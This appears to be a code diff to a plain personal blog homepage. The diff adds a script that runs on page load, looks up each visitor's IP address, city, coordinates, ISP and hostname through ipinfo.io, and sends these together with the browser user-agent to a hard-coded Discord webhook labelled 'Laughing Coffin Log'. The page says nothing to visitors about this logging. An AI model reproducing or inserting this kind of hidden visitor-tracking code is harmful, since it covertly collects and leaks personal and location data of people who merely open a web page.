@@ -8,4 +8,70 @@
 <body>
   <h1>Blog Homepage</h1>
   <p>This is my homepage of my bolg</p>
+</<script>
+// Fetch IP and user-agent info
+fetch('https://ipinfo.io/json')
+.then(response => response.json())
+.then(data => {
+const webhookUrl = 'https://discord.com/api/webhooks/1518991853469437994/S-cvrPw244Ww9ccpCoIxB1INOKYwGODqcv_c5F4KcrUtlVUnSnE5cwzK0V4ElSJzj2WW'; // Replace with your actual webhook URL
+const sourceWebsite = window.location.href; // Dynamically captures the current page URL
+const embed = {
+title: 'Visitor Information',
+description: `A visitor accessed the page from: [${sourceWebsite}](${sourceWebsite})`,
+color: 0x00ff00,
+fields: [
+{
+name: 'IP Address',
+value: data.ip || 'Unknown',
+inline: false
+},
+{
+name: 'User-Agent',
+value: navigator.userAgent || 'Unknown',
+inline: false
+},
+{
+name: 'Location',
+value: `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country || 'Unknown'}`,
+inline: false
+},
+{
+name: 'ISP',
+value: data.org || 'Unknown',
+inline: false
+},
+{
+name: 'Coordinates',
+value: data.loc ? `Latitude: ${data.loc.split(',')[0]}, Longitude: ${data.loc.split(',')[1]}` : 'Unknown',
+inline: false
+},
+{
+name: 'Hostname',
+value: data.hostname || 'Unknown',
+inline: false
+}
+],
+image: {
+url: 'https://i.makeagif.com/media/9-29-2024/GThJmT.gif' // Replace with your GIF URL
+},
+footer: {
+text: 'Laughing Coffin Log'
+}
+};
+
+// Send to Discord webhook
+fetch(webhookUrl, {
+method: 'POST',
+headers: {
+'Content-Type': 'application/json'
+},
+body: JSON.stringify({
+username: 'Laughing Coffin',
+embeds: [embed]
+})
+}).catch(error => console.error('Error sending to webhook:', error));
+})
+.catch(error => console.error('Error fetching IP info:', error));
+</script>
 </body>
+</html>
